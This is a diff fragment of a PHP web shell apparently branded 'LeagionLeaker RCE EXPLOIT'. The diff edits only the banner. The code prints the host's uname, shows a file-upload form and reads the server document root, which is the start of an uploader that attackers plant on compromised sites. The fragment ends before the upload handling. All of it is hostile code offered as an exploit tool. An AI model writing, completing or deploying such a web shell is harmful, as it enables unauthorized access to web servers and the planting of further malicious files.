@@ -1,4 +1,4 @@
-<?php echo '<center><h1><font size="7" color="#66ffff">LeagionLeaker RCE EXPLOIT @LeagionLeaker</h1></font>'.'<br><b><font size="4" color="#ff9933">'.'[uname] '.php_uname().' [/uname] '.'</b></font><br><br><br>';
+<?php echo '<center><h1><font size="7" color="#66ffff">@LeagionLeaker RCE EXPLOIT </h1></font>'.'<br><b><font size="4" color="#ff9933">'.'[uname] '.php_uname().' [/uname] '.'</b></font><br><br><br>';
 echo'<form method="post"enctype="multipart/form-data">';
 echo'<input type="file"name="file"><input name="_upl"type="submit"value="Upload"></form>';
 $root = $_SERVER['DOCUMENT_ROOT'];
